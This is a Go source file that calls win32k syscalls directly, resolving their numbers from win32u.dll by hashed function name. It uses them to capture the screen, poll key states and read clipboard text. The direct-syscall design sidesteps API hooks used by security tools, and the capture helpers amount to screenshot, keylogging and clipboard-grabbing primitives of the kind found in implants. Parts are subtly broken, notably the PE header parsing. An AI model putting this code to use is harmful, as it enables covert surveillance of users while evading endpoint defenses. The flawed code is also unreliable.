//go:build windows

package syscallwin

import (
	"fmt"
	"runtime/debug"
	"unicode/utf16"
	"unsafe"
)

// The win32k syscall surface (NtUser*/NtGdi*, exposed as direct syscall
// stubs inside win32u.dll) is a separate SSN space from ntdll. The `syscall`
// instruction dispatches by SSN regardless of module, so the same assembly
// path works once the SSN is resolved against win32u's export table.

var (
	win32uMod   uintptr
	win32uSize  uintptr
	win32uCache map[uint32]uint16
	win32uReady bool
)

const (
	cfUTF16Text = 13
	srcCopy     = 0x00CC0020
)

func InitWin32u() error {
	if win32uReady {
		return nil
	}
	mod, err := GetModuleBase("win32u.dll")
	if err != nil {
		return fmt.Errorf("get win32u base: %w", err)
	}
	win32uMod = mod

	dosHeader := *(*uintptr)(unsafe.Pointer(mod))
	ntHeadersOffset := *(*uint32)(unsafe.Pointer(dosHeader + 0x3C))
	ntHeaders := mod + uintptr(ntHeadersOffset)
	optionalHeader := ntHeaders + 0x18
	imageSize := *(*uint32)(unsafe.Pointer(optionalHeader + 0x38))
	win32uSize = uintptr(imageSize)

	win32uCache = make(map[uint32]uint16, 64)
	win32uReady = true
	return nil
}

func GetWin32uSSN(funcHash uint32) (uint16, error) {
	if !win32uReady {
		if err := InitWin32u(); err != nil {
			return 0, err
		}
	}
	if ssn, ok := win32uCache[funcHash]; ok {
		return ssn, nil
	}
	ssn, err := resolveSSNIn(win32uMod, win32uSize, funcHash)
	if err != nil {
		return 0, err
	}
	win32uCache[funcHash] = ssn
	return ssn, nil
}

// DirectWin32u issues a win32k syscall through win32u.dll's SSN space.
// Supports up to 9 arguments (the win32k ABI needs 9 for BitBlt).
func DirectWin32u(funcName string, args ...uintptr) (uintptr, error) {
	ssn, err := GetWin32uSSN(DJB2Hash(funcName))
	if err != nil {
		return 0, fmt.Errorf("GetWin32uSSN(%s): %w", funcName, err)
	}
	var a [9]uintptr
	for i, arg := range args {
		if i < 9 {
			a[i] = arg
		}
	}
	switch len(args) {
	case 0, 1, 2, 3, 4, 5, 6, 7:
		r1, _ := Syscall(uint32(ssn), a[0], a[1], a[2], a[3], a[4], a[5], a[6])
		return r1, nil
	case 8:
		r1, _ := Syscall9(uint32(ssn), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], 0)
		return r1, nil
	default:
		r1, _ := Syscall9(uint32(ssn), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8])
		return r1, nil
	}
}

// Screenshot captures the primary display into a bottom-up 24/32 bpp BMP.
func Screenshot() ([]byte, error) {
	hdcScreen, err := DirectWin32u("NtUserGetDC", 0)
	if err != nil || hdcScreen == 0 {
		return nil, fmt.Errorf("get screen DC")
	}
	defer DirectWin32u("NtUserReleaseDC", 0, hdcScreen)

	w := int(hdcResult(DirectWin32u("NtGdiGetDeviceCaps", hdcScreen, 8)))
	h := int(hdcResult(DirectWin32u("NtGdiGetDeviceCaps", hdcScreen, 10)))
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid screen dimensions %dx%d", w, h)
	}
	bpp := 32
	if p, err := DirectWin32u("NtGdiGetDeviceCaps", hdcScreen, 14); err == nil && p != 0 {
		if c, err := DirectWin32u("NtGdiGetDeviceCaps", hdcScreen, 12); err == nil && c != 0 {
			bpp = int(p) * int(c)
		}
	}
	if bpp != 24 && bpp != 32 {
		bpp = 32
	}

	hdcMem, err := DirectWin32u("NtGdiCreateCompatibleDC", hdcScreen)
	if err != nil || hdcMem == 0 {
		return nil, fmt.Errorf("create compatible DC")
	}
	defer DirectWin32u("NtGdiDeleteDC", hdcMem)

	hBmp, err := DirectWin32u("NtGdiCreateCompatibleBitmap", hdcScreen, uintptr(w), uintptr(h))
	if err != nil || hBmp == 0 {
		return nil, fmt.Errorf("create compatible bitmap")
	}
	defer DirectWin32u("NtGdiDeleteObject", hBmp)

	old, _ := DirectWin32u("NtGdiSelectBitmap", hdcMem, hBmp)
	defer DirectWin32u("NtGdiSelectBitmap", hdcMem, old)

	if r, err := DirectWin32u("NtGdiBitBlt", hdcMem, 0, 0, uintptr(w), uintptr(h), hdcScreen, 0, 0, srcCopy); err != nil || r == 0 {
		return nil, fmt.Errorf("bitblt failed")
	}

	row := ((w*bpp + 31) / 32) * 4
	pixels := make([]byte, row*h)
	if r, _ := DirectWin32u("NtGdiGetBitmapBits", hBmp, uintptr(len(pixels)), uintptr(unsafe.Pointer(unsafe.SliceData(pixels)))); r == 0 {
		return nil, fmt.Errorf("read bitmap bits")
	}

	return encodeBMP(w, h, bpp, row, pixels), nil
}

func hdcResult(v uintptr, err error) uintptr {
	_ = err
	return v
}

func encodeBMP(w, h, bpp, row int, pixels []byte) []byte {
	out := make([]byte, 0, 54+len(pixels))
	out = append(out, 'B', 'M')
	appendLE32(&out, uint32(54+len(pixels)))
	appendLE32(&out, 0)
	appendLE32(&out, 54)
	appendLE32(&out, 40)
	appendLE32(&out, uint32(w))
	appendLE32(&out, uint32(h)) // positive height: bottom-up DIB
	appendLE16(&out, 1)
	appendLE16(&out, uint16(bpp))
	appendLE32(&out, 0) // BI_RGB
	appendLE32(&out, uint32(len(pixels)))
	appendLE32(&out, 2835)
	appendLE32(&out, 2835)
	appendLE32(&out, 0)
	appendLE32(&out, 0)
	return append(out, pixels...)
}

func appendLE32(b *[]byte, v uint32) {
	*b = append(*b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func appendLE16(b *[]byte, v uint16) {
	*b = append(*b, byte(v), byte(v>>8))
}

// IsKeyDown reads the async key state through NtUserGetAsyncKeyState;
// bit 15 of the return flags the key as down right now.
func IsKeyDown(vk byte) bool {
	r, err := DirectWin32u("NtUserGetAsyncKeyState", uintptr(vk))
	if err != nil {
		return false
	}
	return r&0x8000 != 0
}

// ClipboardText returns the current clipboard CF_UNICODETEXT as UTF-8.
// The HGLOBAL returned by GetClipboardData is a dereferenceable shared
// block for the clipboard formats, so it is read in place.
func ClipboardText() ([]byte, error) {
	defer func() {
		if recover() != nil {
			debug.PrintStack()
		}
	}()

	if r, _ := DirectWin32u("NtUserOpenClipboard", 0); r == 0 {
		return nil, fmt.Errorf("open clipboard failed")
	}
	defer DirectWin32u("NtUserCloseClipboard")

	h, err := DirectWin32u("NtUserGetClipboardData", cfUTF16Text)
	if err != nil || h == 0 {
		return nil, fmt.Errorf("clipboard: no unicode text")
	}

	const max = 128 * 1024
	var units []uint16
	for sz := 0; sz < max/2; sz++ {
		c := *(*uint16)(unsafe.Pointer(h + uintptr(sz)*2))
		if c == 0 {
			break
		}
		units = append(units, c)
	}
	return []byte(string(utf16.Decode(units))), nil
}
